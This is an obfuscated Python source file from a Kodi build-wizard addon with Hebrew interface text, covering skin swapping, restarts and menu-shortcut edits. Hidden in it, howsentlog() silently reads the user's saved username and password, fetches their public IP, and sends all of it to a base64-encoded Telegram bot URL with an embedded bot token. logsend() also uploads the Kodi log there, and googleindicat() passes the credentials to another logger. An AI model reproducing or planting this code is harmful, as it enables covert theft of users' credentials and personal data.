# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OOO00O0O000OO0OOO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0000O0O0O0O0OO00 =[];OO000OO000O0OO00O =[]#line:261
	for OOO0OOO00OO00000O in sorted (OOO00O0O000OO0OOO ,key =lambda O0OO00O0O00OOO0O0 :O0OO00O0O00OOO0O0 ):#line:262
		O00000O0OOO000OOO =os .path .split (OOO0OOO00OO00000O [:-1 ])[1 ]#line:263
		O0O00000OOO00O000 =os .path .join (OOO0OOO00OO00000O ,'addon.xml')#line:264
		if os .path .exists (O0O00000OOO00O000 ):#line:265
			OOOO0OOO0OOOOO0OO =open (O0O00000OOO00O000 )#line:266
			O00O00O000OO0O0O0 =OOOO0OOO0OOOOO0OO .read ()#line:267
			O00O0OOO00O0OOOO0 =parseDOM2 (O00O00O000OO0O0O0 ,'addon',ret ='id')#line:268
			O0000OOOO0O0OOOO0 =O00000O0OOO000OOO if len (O00O0OOO00O0OOOO0 )==0 else O00O0OOO00O0OOOO0 [0 ]#line:269
			try :#line:270
				O00000OO000000O0O =xbmcaddon .Addon (id =O0000OOOO0O0OOOO0 )#line:271
				O0000O0O0O0O0OO00 .append (O00000OO000000O0O .getAddonInfo ('name'))#line:272
				OO000OO000O0OO00O .append (O0000OOOO0O0OOOO0 )#line:273
			except :#line:274
				pass #line:275
	O00OOOOOO0O0OOOO0 =[];OOOOO000O00000OO0 =0 #line:276
	OOO00OO0O00O00OO0 =["Current Skin -- %s"%currSkin ()]+O0000O0O0O0O0OO00 #line:277
	OOOOO000O00000OO0 =DIALOG .select ("Select the Skin you want to swap with.",OOO00OO0O00O00OO0 )#line:278
	if OOOOO000O00000OO0 ==-1 :return #line:279
	else :#line:280
		OO0OO000O00OO00O0 =(OOOOO000O00000OO0 -1 )#line:281
		O00OOOOOO0O0OOOO0 .append (OO0OO000O00OO00O0 )#line:282
		OOO00OO0O00O00OO0 [OOOOO000O00000OO0 ]="%s"%(O0000O0O0O0O0OO00 [OO0OO000O00OO00O0 ])#line:283
	if O00OOOOOO0O0OOOO0 ==None :return #line:284
	for OOOO0OO0O0O0O0000 in O00OOOOOO0O0OOOO0 :#line:285
		swapSkins (OO000OO000O0OO00O [OOOO0OO0O0O0O0000 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOO00OOO0O00OO0O0 ,title ="Error"):#line:290
	OOOOO00O0O0O0O000 ='lookandfeel.skin'#line:291
	OO000OO00OOO00OO0 =OOO00OOO0O00OO0O0 #line:292
	O00000O00000OOOO0 =getOld (OOOOO00O0O0O0O000 )#line:293
	O0O00O0O00O00OO0O =OOOOO00O0O0O0O000 #line:294
	setNew (O0O00O0O00O00OO0O ,OO000OO00OOO00OO0 )#line:295
	OOOOOO000O00OO000 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOOO000O00OO000 <100 :#line:297
		OOOOOO000O00OO000 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OO0OOO00O00O0O00O ):#line:304
	try :#line:305
		OO0OOO00O00O0O00O ='"%s"'%OO0OOO00O00O0O00O #line:306
		O00OO00OO00O00OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0OOO00O00O0O00O )#line:307
		OO00OO000O00O0000 =xbmc .executeJSONRPC (O00OO00OO00O00OOO )#line:309
		OO00OO000O00O0000 =simplejson .loads (OO00OO000O00O0000 )#line:310
		if OO00OO000O00O0000 .has_key ('result'):#line:311
			if OO00OO000O00O0000 ['result'].has_key ('value'):#line:312
				return OO00OO000O00O0000 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0OO0O0000O000OOO ,O00O00O00O000000O ):#line:319
	try :#line:320
		O0OO0O0000O000OOO ='"%s"'%O0OO0O0000O000OOO #line:321
		O00O00O00O000000O ='"%s"'%O00O00O00O000000O #line:322
		OO00O0OOOOO0OO0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0OO0O0000O000OOO ,O00O00O00O000000O )#line:323
		OO0O0OO000O00O000 =xbmc .executeJSONRPC (OO00O0OOOOO0OO0O0 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO0OO000000000O00 =xbmcgui .DialogProgress ()#line:334
			OO0OO000000000O00 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO0OO000000000O00 .update (0 )#line:338
			for OOO0OO0O0O0O0O00O in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO0OO000000000O00 .update (int ((5 -OOO0OO0O0O0O0O00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOO0OO0O0O0O0O00O ),'')#line:341
				if OO0OO000000000O00 .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO0OO000000000O00 =xbmcgui .DialogProgress ()#line:347
			OO0OO000000000O00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO0OO000000000O00 .update (0 )#line:351
			for OOO0OO0O0O0O0O00O in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO0OO000000000O00 .update (int ((5 -OOO0OO0O0O0O0O00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO0OO0O0O0O0O00O ),'')#line:354
				if OO0OO000000000O00 .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          O000O0OOO0000O000 =(ADDON .getSetting ("user"))#line:371
          OOOO0O0OOOO0O000O =(ADDON .getSetting ("pass"))#line:372
          OOO0O0OOO00O0OOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          O0O00O00O000O00OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          O0000O0O0OOOOO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          O0000000OO0O00OO0 =str (json .loads (O0000O0O0OOOOO0O0 )['ip'])#line:377
          OOO0O00000OOOO0OO =O000O0OOO0000O000 #line:378
          OO0O00OO00O000OOO =OOOO0O0OOOO0O000O #line:379
          import socket #line:381
          O0000O0O0OOOOO0O0 =urllib2 .urlopen (O0O00O00O000O00OO .decode ('base64')+' - '+OOO0O00000OOOO0OO +' - '+OO0O00OO00O000OOO +' - '+OOO0O0OOO00O0OOO0 ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OOOO00OOO00O0OO0O =(ADDON .getSetting ("pass"))#line:388
			O00OOOO0O00000O00 =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OOOO00OOO00O0OO0O ,O00OOOO0O00000O00 )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         OOOO0OO0O000O0000 =xbmc .translatePath ('special://home/kodi.log')#line:398
         OOOOO000O000O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0OO0O000O0000 ,open (OOOO0OO0O000O0000 ,'rb')),}#line:402
         OO0OOO00OOOOOO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         O0OOO0OOO000OO000 =requests .post (OO0OOO00OOOOOO0O0 .decode ('base64'),files =OOOOO000O000O0OOO )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           OOOO0OO0O000O0000 =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OOOOO000O000O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0OO0O000O0000 ,open (OOOO0OO0O000O0000 ,'rb')),}#line:411
           OO0OOO00OOOOOO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           O0OOO0OOO000OO000 =requests .post (OO0OOO00OOOOOO0O0 .decode ('base64'),files =OOOOO000O000O0OOO )#line:414
      else :#line:415
           OOOO0OO0O000O0000 =xbmc .translatePath ('special://profile/kodi.log')#line:416
           OOOOO000O000O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0OO0O000O0000 ,open (OOOO0OO0O000O0000 ,'rb')),}#line:420
           OO0OOO00OOOOOO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           O0OOO0OOO000OO000 =requests .post (OO0OOO00OOOOOO0O0 .decode ('base64'),files =OOOOO000O000O0OOO )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	resloginit .resloginit ('restore','all')#line:428
	OOO000OOO000O0O0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:429
	OOOO0OOO000OO00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:430
	copyfile (OOO000OOO000O0O0O ,OOOO0OOO000OO00O0 )#line:431
def skindialogsettind18 ():#line:432
	try :#line:433
		OO000OO0O000O000O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:434
		O0000O000OO0OOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:435
		copyfile (OO000OO0O000O000O ,O0000O000OO0OOOO0 )#line:436
	except :pass #line:437
def rdon ():#line:438
	loginit .loginIt ('restore','all')#line:439
	OO0OO0O00OOO0OOOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:441
	OO0OOOOO00OOO0OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:442
	copyfile (OO0OO0O00OOO0OOOO ,OO0OOOOO00OOO0OOO )#line:443
def adults18 ():#line:445
  O0O0OOO0O00O000O0 =(ADDON .getSetting ("adults"))#line:446
  if O0O0OOO0O00O000O0 =='true':#line:447
    O0000OO0OO0O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:448
    with open (O0000OO0OO0O0OO00 ,'r')as O0O00OO0O0OO00O00 :#line:449
      O00OOOOO0O0O0OOOO =O0O00OO0O0OO00O00 .read ()#line:450
    O00OOOOO0O0O0OOOO =O00OOOOO0O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:468
    with open (O0000OO0OO0O0OO00 ,'w')as O0O00OO0O0OO00O00 :#line:471
      O0O00OO0O0OO00O00 .write (O00OOOOO0O0O0OOOO )#line:472
def rdbuildaddon ():#line:473
  OO00000O000OOO0O0 =(ADDON .getSetting ("rdbuild"))#line:474
  if OO00000O000OOO0O0 =='true':#line:475
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:476
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:477
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:478
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:496
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:499
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:500
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:504
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:505
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:506
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:524
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:527
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:528
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:532
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:533
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:534
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:552
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:555
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:556
